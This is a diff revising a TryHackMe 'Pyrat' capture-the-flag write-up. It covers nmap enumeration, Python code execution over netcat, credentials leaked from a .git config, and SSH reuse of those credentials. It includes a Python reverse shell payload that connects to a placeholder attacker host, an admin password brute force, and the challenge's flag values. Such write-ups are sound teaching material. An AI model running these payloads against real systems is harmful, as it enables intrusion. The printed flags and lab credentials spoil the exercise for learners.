@@ -1,72 +1,89 @@
-🏴 Pyrat – TryHackMe Write-Up
+🏴 Pyrat — TryHackMe Write-Up
+📌 General Notes
 
-Note: Always use Incognito Mode while accessing TryHackMe machines.
-Cached data can cause unexpected errors.
+Always use Incognito Mode when accessing TryHackMe machines
 
-📌 Important Notes
+Browser cache may cause unexpected behavior
 
-Always use Incognito mode for web access
+Maintain proper /etc/hosts entries if required
 
-Browser cache may lead to misleading behavior
+Focus on understanding tool logic and service behavior
 
-Maintain proper entries in /etc/hosts
+Keep reports structured and readable
 
-Study tools carefully and understand logic & workflow
+🔍 Enumeration
+🔎 Nmap Scan
 
-Document findings properly (important for reports & GitHub)
+Command used:
 
-🔍 Initial Enumeration
-Nmap Scan
-nmap -sC -sV <target-ip>
+nmap -sC -sV -oN scan.txt <target-ip>
 
 
-Open Ports:
+Key findings:
 
-22/tcp    open  ssh
-8000/tcp  open  http
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
+8000/tcp open  http     SimpleHTTP/0.6 Python/3.11.2
+
+🧠 Analysis
+
+SSH (22) → Standard OpenSSH service, requires valid credentials
+
+Port 8000 → Python-based HTTP service behaving abnormally
+
+HTTP methods such as GET, OPTIONS, and HELP returned Python errors
+
+Strong indicator that user input is directly evaluated by Python
+
+This made port 8000 the primary attack surface.
 
 🌐 Service Enumeration (Port 8000)
 
-Connecting to the service:
+Connected manually using Netcat:
 
 nc <target-ip> 8000
 
-Testing Python Code Execution
+
+The service accepted raw Python input, confirming Python code execution.
+
+File System Testing
 print(os.listdir("/root"))
 # Permission denied
 
 print(os.listdir("/opt/dev/.git/"))
 
 
-📌 Access to .git directory revealed sensitive information.
+The .git directory was readable and contained sensitive information.
 
-🔑 Credential Discovery
+🔑 Credential Discovery (Git Leak)
 
-Inside .git configuration:
+Inside Git configuration:
 
 [credential "https://github.com"]
     username = think
     password = _TH1NKINGPirate$_
 
-🐚 Reverse Shell Access
-Terminal 1 (Payload Execution)
-echo 'import socket,subprocess,os;
+
+These credentials were later reused for SSH access.
+
+🐚 Reverse Shell
+Listener (Attacker Machine)
+nc -lvnp 4000
+
+Python Reverse Shell Payload
+echo 'import socket,os,pty;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("YOUR-IP",4000));
+s.connect(("ATTACKER-IP",4000));
 os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
-import pty; pty.spawn("sh")' | nc <target-ip> 8000
-
-Terminal 2 (Listener)
-nc -lvnp 4000
+pty.spawn("sh")' | nc <target-ip> 8000
 
 
-📌 Successfully obtained a shell.
+A shell was successfully obtained.
 
 👤 User Access (think)
 
-Using discovered credentials:
+Using leaked credentials:
 
 ssh think@<target-ip>
 
@@ -78,42 +95,34 @@ Running Processes
 ps aux | grep root
 
 
-Output revealed:
+Relevant output:
 
 root  python3 /root/pyrat.py
 
 
-📌 Script running as root:
+A custom Python script was running as root, indicating a possible escalation vector.
 
-/root/pyrat.py
+🧠 Root Script Analysis (/root/pyrat.py)
 
-🧠 Script Analysis
+Revealed a hidden admin authentication endpoint
 
-From /root/pyrat.py:
+Username differed from system users
 
-Discovered hidden admin endpoint
+Password-based authentication required
 
-Admin username ≠ system username
+🔐 Password Brute Force (Custom Script)
 
-Password required
+Since the service was not HTTP-based, a custom Python brute-force script was created using raw TCP sockets.
 
-🔓 Privilege Escalation Techniques Used
+Brute Force Script (Used)
+python newscript.py <target-ip> 8000 wordlist.txt
 
-LinPEAS (Linux Privilege Escalation Awesome Script)
-
-Password Brute Force (after discovering endpoint)
-
-CVE-2019-18862 (LD_PRELOAD exploit)
-👉 https://github.com/bcoles/local-exploits/blob/master/CVE-2019-18862/exploit.ldpreload.sh
-
-🔐 Admin Access
-nc <target-ip> 8000
-
+Result
 Username: admin
 Password: abc123
 
 
-📌 Root shell obtained.
+Authentication succeeded, granting root-level shell access.
 
 🏁 Root Flag
 print(open('/root/root.txt', 'r').read())
@@ -121,22 +130,22 @@ print(open('/root/root.txt', 'r').read())
 ba5ed03e9e74bb98054438480165e221
 
 🏆 Flags Summary
-Flag Type	Value
-User Flag	996bdb1f619a68361417cabca5454705
-Root Flag	ba5ed03e9e74bb98054438480165e221
-🧩 Key Learnings
+Type	Flag
+User	996bdb1f619a68361417cabca5454705
+Root	ba5ed03e9e74bb98054438480165e221
+🧩 Key Takeaways
 
-Misconfigured .git directories leak credentials
+Python-based services may evaluate user input directly
 
-Python code execution can lead to full compromise
+Exposed .git directories can leak critical credentials
 
-Always inspect running root processes
+Custom brute-force scripts outperform automated tools on non-standard services
 
-Privilege escalation often hides in custom scripts
+Root privilege escalation often hides in custom scripts
 
-Understanding workflow > blindly running tools
+Enumeration depth matters more than speed
 
-🚀 Tools Used
+🛠 Tools Used
 
 Nmap
 
@@ -144,8 +153,6 @@ Netcat
 
 SSH
 
+Python (custom scripts)
+
 LinPEAS
-
-Python Reverse Shell
-
-Git Enumeration****
